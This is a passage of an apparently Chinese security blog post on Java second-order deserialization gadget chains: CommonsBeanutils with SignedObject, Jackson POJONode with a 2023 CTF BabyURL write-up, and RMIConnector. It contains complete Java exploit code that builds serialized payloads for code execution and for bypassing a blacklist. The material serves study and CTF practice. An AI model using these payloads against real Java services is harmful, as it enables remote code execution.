<span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">facField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        facField.setAccessible(<span class="hljs-literal">true</span>);<br>        facField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>        System.out.println(PropertyUtils.getProperty(templates, <span class="hljs-string">&quot;outputProperties&quot;</span>));<br></code></pre></td></tr></table></figure><p>‍</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124837.png" alt="image">​</p><p>那么现在已经后半条链已经衔接好了，现在就是去找jdk跟CB依赖中进行衔接的反序列化点</p><p>也就是去找谁去调用了<code>getProperty</code>​方法</p><p>‍</p><p>于是找到了 <code>commons-beanutils-1.8.3.jar!\org\apache\commons\beanutils\BeanComparator#compare()</code>​方法</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124045.png" alt="image">​</p><p>这写法跟CC4的太像了真的，所以找到<code>compare()</code>​就可以联想到CC4的入口直接拼起来就可以串起来了</p><p>其实在这里我一直有个疑问，就是这个<code>compare()</code>​到底是否可控，因为他传两个参数我并不知道是在哪里可以控制的，调试了下也明白了，如下图</p><p>可以发现在721行是将<code>x</code>​传入，那么<code>x</code>​怎么进来的呢？</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124565.png" alt="image">​</p><p>在上一个方法中就把<code>x</code>​传进来了</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124759.png" alt="image">​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124917.png" alt="image">​</p><p>在<code>heapify</code>​中就传了对象，再往上跟就是<code>readObject</code>​了，而在<code>heapify</code>​中进行了数组的右移所以可以寻找到该属性通过 <code>priorityQueue.add(templates);</code>​传入的类,如果我们传入 <code>3</code>​ 就会不一样了</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125105.png" alt="image">​</p><p>就会变成数字类<code>3</code>​ 这也就是为什么我们队列这里要写入<code>TemplatesImpl</code>​类，这样子才能去调用到<code>TemplatesImpl</code>​类的getter方法</p><p>‍</p><p>调用链</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">PriorityQueue#ReadObject()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">PriorityQueue#siftDownUsingComparator()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">BeanComparator#compare()</span> <span class="hljs-string">-&gt;PropertyUtilsBean#getSimpleProperty()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">TemplatesImpl#getOutputProperties()</span><br></code></pre></td></tr></table></figure><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> SignedObject;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB_SignedObject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue1</span> <span class="hljs-operator">=</span> getpayload(obj, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(queue1, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue2</span> <span class="hljs-operator">=</span> getpayload(signedObject, <span class="hljs-string">&quot;object&quot;</span>);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(queue2);<br>        oos.close();<br>        <span class="hljs-comment">//System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> PriorityQueue&lt;Object&gt; <span class="hljs-title function_">getpayload</span><span class="hljs-params">(Object object, String string)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, beanComparator);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, string);<br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;object, <span class="hljs-literal">null</span>&#125;);<br>        <span class="hljs-keyword">return</span> priorityQueue;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">getObject:<span class="hljs-number">179</span>, SignedObject (java.security)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>invokeMethod:<span class="hljs-number">2116</span>, PropertyUtilsBean (org.apache.commons.beanutils)<br>getSimpleProperty:<span class="hljs-number">1267</span>, PropertyUtilsBean (org.apache.commons.beanutils)<br>getNestedProperty:<span class="hljs-number">808</span>, PropertyUtilsBean (org.apache.commons.beanutils)<br>getProperty:<span class="hljs-number">884</span>, PropertyUtilsBean (org.apache.commons.beanutils)<br>getProperty:<span class="hljs-number">464</span>, PropertyUtils (org.apache.commons.beanutils)<br>compare:<span class="hljs-number">163</span>, BeanComparator (org.apache.commons.beanutils)<br>siftDownUsingComparator:<span class="hljs-number">722</span>, PriorityQueue (java.util)<br>siftDown:<span class="hljs-number">688</span>, PriorityQueue (java.util)<br>heapify:<span class="hljs-number">737</span>, PriorityQueue (java.util)<br>readObject:<span class="hljs-number">797</span>, PriorityQueue (java.util)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>invokeReadObject:<span class="hljs-number">1170</span>, ObjectStreamClass (java.io)<br>readSerialData:<span class="hljs-number">2178</span>, ObjectInputStream (java.io)<br>readOrdinaryObject:<span class="hljs-number">2069</span>, ObjectInputStream (java.io)<br>readObject0:<span class="hljs-number">1573</span>, ObjectInputStream (java.io)<br>readObject:<span class="hljs-number">431</span>, ObjectInputStream (java.io)<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h4 id="Jackson链"><a href="#Jackson链" class="headerlink" title="Jackson链"></a>Jackson链</h4><p>这里也是重复的事情了，如果有疑问的话可以继续参考我博客</p><p>其实就是通过<code>POJONode#tostring()</code>​来进行getter的调用，那么怎么触发tostring方法呢在反序列化中，也就是两种形式</p><ol><li>​<code>Rome</code>​ 上述的<code>ToStringBean#tostring()</code>​</li><li>​<code>BadAttributeValueExpException#readObject()</code>​</li></ol><p>‍</p><h5 id="例题分析-2023-巅峰极客-BabyURL"><a href="#例题分析-2023-巅峰极客-BabyURL" class="headerlink" title="例题分析 - 2023 巅峰极客 BabyURL"></a>例题分析 - 2023 巅峰极客 BabyURL</h5><p>‍</p><h6 id="考点分析"><a href="#考点分析" class="headerlink" title="考点分析"></a>考点分析</h6><ol><li>Java代码审计</li><li>Java SignedObject 二次反序列化</li><li>Jackson 链反序列化漏洞</li></ol><p>‍</p><p>给了jar包，先看目录结构</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125292.png" alt="image">​</p><p>‍</p><p>有两个控制器</p><p>第一个是<code>hack</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125443.png" alt="image">​</p><p>传base64的payload进来反序列化成<code>URLHelper</code>​类，但这里是他自己写的反序列化，跟进下<code>MyObjectInputStream</code>​发现写了黑名单</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125600.png" alt="image">​</p><p>​<code>java.net.InetAddress&quot;,&quot;org.apache.commons.collections.Transformer&quot;,&quot;org.apache.commons.collections.functors&quot;, &quot;com.yancao.ctf.bean.URLVisiter&quot;, &quot;com.yancao.ctf.bean.URLHelper</code>​</p><p>‍</p><p>第二个是<code>file</code>​</p><p>&#x2F;file路由会读取&#x2F;tmp&#x2F;file的内容并返回</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125770.png" alt="image">​</p><p>‍</p><p>再来看看黑名单的两个类</p><p>​<code>URLHelper</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125946.png" alt="image">​</p><p>‍</p><p>在ReadObject方法中可以对<code>/tmp/file/</code>​操作，并且会用<code>visitUrl</code>​处理传入的值</p><p>‍</p><p>​<code>URLVisiter</code>​</p><p>传入的内容不能以<code>file</code>​开头，对传入的内容进行<code>new URL()</code>​处理</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125145.png" alt="image">​</p><p>那么限制我们来罗列一下</p><ol><li>可以打URL的一个读取文件，但是有一个黑名单拦截，但是大写即可绕过</li><li>反序列化存在黑名单，但是可以打SignedObject的二次反序列化来触发<code>URLHelper</code>​类</li><li>如何拼接SignedObject链呢？查看依赖发现存在Jackson链 ，想到<code>BadAttributeValueExpException</code>​ 配合 <code>POJONode</code>​ 链</li></ol><p>‍</p><p>那么问题就解决了，编写下EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.yancao.ctf;<br><br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLHelper;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLVisiter;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLHelper</span> <span class="hljs-variable">urlHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot;File:///flag&quot;</span>);<br>        urlHelper.visiter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(urlHelper, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        ser(val);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><p>再次访问下file即可得到flag</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125300.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><h1 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h1><p>‍</p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">nvokerTransform#transform()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">RMIConnector#connect()</span> <span class="hljs-string">-&gt;&gt;</span> <span class="hljs-string">RMIConnector#findRMIServerJRMP()</span><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>‍</p><h4 id="RMIConnector-findRMIServerJRMP-​"><a href="#RMIConnector-findRMIServerJRMP-​" class="headerlink" title="RMIConnector#findRMIServerJRMP()​"></a><code>RMIConnector#findRMIServerJRMP()</code>​</h4><p>在该方法中，将base64字符串解码后以序列化流的形式进行反序列化操作，如果能控制base64参数即可造成二次反序列化</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125459.png" alt="image">​</p><p>网上寻找，找到同文件的<code>findRMIServer</code>​方法有调用，且判断path的开头必须为&#x2F;stub&#x2F;并截取的path后的值，所以path为我们base64序列化字符串的传入点。而path通过getURLPath获取，也就是下面urlPath属性的值，所以这里我们的思路就是通过反射修改urlPath属性的值，为&#x2F;stub&#x2F;base64_ser_str的形式</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125612.png" alt="image">​</p><p>再往上跟找到<code>connect()</code>​方法</p><h4 id="​RMIConnector-connect-​​"><a href="#​RMIConnector-connect-​​" class="headerlink" title="​RMIConnector#connect()​​"></a>​<code>RMIConnector#connect()</code>​​</h4><p>‍</p><p>发现是一个public的connect方法调用了</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125804.png" alt="image">​</p><p>那么现在就2个思路</p><ol><li>谁的方法调用了<code>connect</code>​方法并且传入的值可控，然后一直往上跟readobject或者tostring或者getter方法</li><li>谁的反射可控，直接进行反射调用</li></ol><p>‍</p><p>那么现在先写一个本地的直接反射调用的demo来触发二次反序列化</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> RMIconnector;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6_t</span> &#123;<br><br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span 